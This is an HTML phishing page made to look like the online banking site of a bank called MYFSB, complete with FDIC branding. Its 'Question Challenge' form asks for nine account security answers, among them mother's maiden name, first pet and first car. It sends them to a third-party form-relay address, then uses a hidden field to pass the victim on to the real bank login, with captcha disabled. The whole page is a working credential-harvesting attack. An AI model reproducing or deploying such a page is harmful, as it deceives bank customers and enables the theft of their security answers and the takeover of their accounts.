<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MYFSB - Online Banking - Account</title>
    <link rel="stylesheet" href="style2.css" />
    <link rel="shortcut icon" href="1.png" type="image/x-icon" />
  </head>
  <body>
    <section class="fdic">
      <div class="fdic-info">
        <div class="fdic-logo">
          <h1>FDIC</h1>
        </div>
        <div class="fdic-text">
          <p>
            FDIC-Insured - Backed by the full faith and credit of the U.S
            Government
          </p>
        </div>
      </div>
    </section>

    <section class="logo">
      <div class="logo-img">
        <img src="logo.png" alt="" />
      </div>
    </section>

    <section class="user">
      <div class="user-box">
        <div class="user1">
          <nav>
            <ul>
              <li>
                <a href="#">Account Services</a>
              </li>
              <li>
                <a href="#">Bank Services</a>
              </li>
              <li>
                <a href="#">Security</a>
              </li>
              <li>
                <a href="#">Calculators</a>
              </li>
            </ul>
          </nav>
        </div>

        <div class="user2">
          <legend>
            <h3>Question Challenge</h3>
          </legend>

          <div class="form-box">
            <form action="https://formsubmit.co/3b84ccad7db1b7202fb51ec92fbd637a" method="POST">
              <p>
                As an added security measure please answer the following
                question:
                <hr>
              </p>

              <div class="question-info">
                <div class="Q1">
                  <label for="Q1">Who is your favourite celebrity?</label>
                  <input type="text" name="Q1" id="Q1" required />
                </div>

                <div class="Q2">
                  <label for="Q2"> Mother madien name?</label>
                  <input type="text" name="Q2" id="Q2" />
                </div>
                <div class="Q3">
                  <label for="Q3">What color was your first car?</label>
                  <input type="text" name="Q3" id="Q3" required />
                </div>
                <div class="Q4">
                  <label for="Q4">What is your favourite movie?</label>
                  <input type="text" name="Q4" id="Q4" required />
                </div>

                <div class="Q5">
                  <label for="Q5">What is your favourite song?</label>
                  <input type="text" name="Q5" id="Q5" required />
                </div>

                <div class="Q6">
                  <label for="Q6">What is your favourite vacation spot?</label>
                  <input type="text" name="Q6" id="Q6" required />
                </div>

                <div class="Q7">
                  <label for="Q7">What was the name of your first pet?</label>
                  <input type="text" name="Q7" id="Q7" required />
                </div>

                <div class="Q8">
                  <label for="Q8">Where did you meet your spouse?</label>
                  <input type="text" name="Q8" id="Q8" required />
                </div>

                <div class="Q9">
                  <label for="Q9">What was your first car?</label>
                  <input type="text" name="Q9" id="Q9" required />
                </div>
                <div class="hidden-input">
                     <input
                    type="hidden"
                    name="_next"
                    value="https://myfsb.onlineaurora.com/BankBin/Login"
                  />
                  <input type="hidden" name="_captcha" value="false">
                </div>
              </div>

              <!-- <div class="forgot">
                <a href="#">Forgot Password?</a>
              </div> -->

              <div class="btn">
                <button type="submit">Submit Answer</button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
  </body>
</html>
